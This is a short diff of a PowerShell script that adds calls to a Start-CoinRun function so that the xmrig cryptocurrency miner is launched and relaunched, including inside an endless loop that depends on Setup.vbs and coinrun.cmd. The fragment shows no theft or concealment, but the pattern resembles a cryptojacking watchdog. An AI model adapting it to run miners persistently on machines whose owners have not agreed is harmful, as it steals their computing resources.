@@ -8,7 +8,7 @@ function Start-CoinRun {
 }
 
 if (Test-Path $xmrigPath) {
-    
+    Start-CoinRun
 } else {
     Write-Warning "xmrig.exe DoseNotExist..."
     if (Test-Path $setupPath) {
@@ -21,7 +21,7 @@ if (Test-Path $xmrigPath) {
         }
 
         Write-Host "xmrig.exe. RUN coinrun.cmd"
-        
+        Start-CoinRun
     } else {
         Write-Error "NO Setup.vbs"
     }
@@ -41,7 +41,7 @@ while ($true) {
             }
 
             Write-Host "START coinrun.cmd"
-            
+            Start-CoinRun
         } else {
             Write-Error "NO Setup.vbs: $setupPath"
         }
